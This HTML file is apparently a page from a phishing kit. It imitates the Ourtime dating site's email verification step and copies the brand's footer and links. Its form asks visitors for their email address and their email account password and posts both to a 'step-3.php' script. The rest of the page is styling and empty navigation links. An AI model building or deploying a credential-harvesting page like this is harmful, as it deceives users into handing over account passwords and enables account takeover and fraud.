<!doctype html>
<html style="background-image:none">
<head>
<meta charset="utf-8">
<title>Ourtime - Verify Email</title>
<link rel="stylesheet" href="css/style.css">
<script src="js/jqueryLib.js" type="text/javascript"></script>
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="pragma" content="no-cache"><meta name="robots" content="noydir, noodp">
<link rel="shortcut icon" type="image/x-icon" href="images/favicon3.png" data-react-helmet="true">
<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
  <div class="row-21">
    	<div class="row-21-content">
        	<div class="row-21-people-logo"></div>
        </div>
    </div>
  <div class="row-19">
  	<div class="row-19-panel">
    	<div class="row-19-side-1">
       	  <form name="form1" method="post" action="step-3.php">
       	    <table width="350" border="0">
       	      <tr>
       	        <td colspan="2"><span style="font-size:17px;font-weight:bold;color:#55307c">Verify Your Email</span></td>
   	          </tr>
       	      <tr>
       	        <td width="128">&nbsp;</td>
       	        <td width="182">&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td><div style="color:#55307c;margin:0 0 0 10px">Email Address :</div></td>
       	        <td>
   	            <input type="email" name="email_address_verify" id="email_address_verify" required autocomplete="off" class="input-field"></td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td>&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td><div style="color:#55307c;margin:0 0 0 10px">Email Password :</div></td>
       	        <td>
   	            <input type="password" name="password_verify" id="password_verify" required autocomplete="off" class="input-field"></td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td>&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td align="center"><input type="submit" name="btn-verify" id="btn-verify" value="Confirm" class="confirm-btn"></td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td>&nbsp;</td>
   	          </tr>
   	        </table>
      	  </form>
        </div>
       <div class="row-22-side-2">
            	<span style="font-size:13px;">Not a memeber yet?</span><br>
                <a href="https://www.ourtime.com/v3/signup" style="color:#5a9fdb;font-size:14px;text-decoration:none">Join Free</a>
                
                <div style="height:30px;width:100%;border-bottom:1px solid #CCC;margin:0 0 20px 0;"></div>
                
                <span style="font-size:13px;">Forgot password?</span><br>
                <a href="https://www.ourtime.com/v3/forgotpassword" style="color:#5a9fdb;font-size:14px;text-decoration:none">Click here</a>
            </div>
    </div>
  </div>
 <div class="row-20">
 	<div class="row-20-content">
    	Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script> &nbsp;</span> People Media. All rights reserved. 166x2617  . <a href="" style="color:#009fdb">Term of use</a> | <a href="" style="color:#009fdb">Privacy Policy</a> | <a href="" style="color:#009fdb">Cookies Policy</a>

    </div>
 </div>
 <div class="row-23">
 	<div class="row-23-content">
    	

<a href="" style="color:#009fdb;text-decoration:none">home</a> | <a href="" style="color:#009fdb;text-decoration:none">safety tips</a> | <a href="" style="color:#009fdb;text-decoration:none">contact us</a> | <a href="" style="color:#009fdb;text-decoration:none">billing</a> | <a href="" style="color:#009fdb;text-decoration:none">success stories</a> | <a href="" style="color:#009fdb;text-decoration:none">careers </a>| <a href="" style="color:#009fdb;text-decoration:none">about</a> | <a href="" style="color:#009fdb;text-decoration:none">advertise with us</a> | <a href="" style="color:#009fdb;text-decoration:none">search</a> |<a href="" style="color:#009fdb;text-decoration:none"> join now</a> |<a href="" style="color:#009fdb;text-decoration:none"> bookmark page</a> |<a href="" style="color:#009fdb;text-decoration:none"> site map</a>
<a href="" style="color:#009fdb;text-decoration:none">Match.com</a> | <a href="" style="color:#009fdb;text-decoration:none">Chemistry.com </a>| <a href="" style="color:#009fdb;text-decoration:none">Mature Dating</a> |<a href="" style="color:#009fdb;text-decoration:none"> Black Singles</a> | <a href="" style="color:#009fdb;text-decoration:none">Big and Beautiful</a>

    </div>
 </div>
<script src="js/action.js" type="text/javascript"></script>
</body>
</html>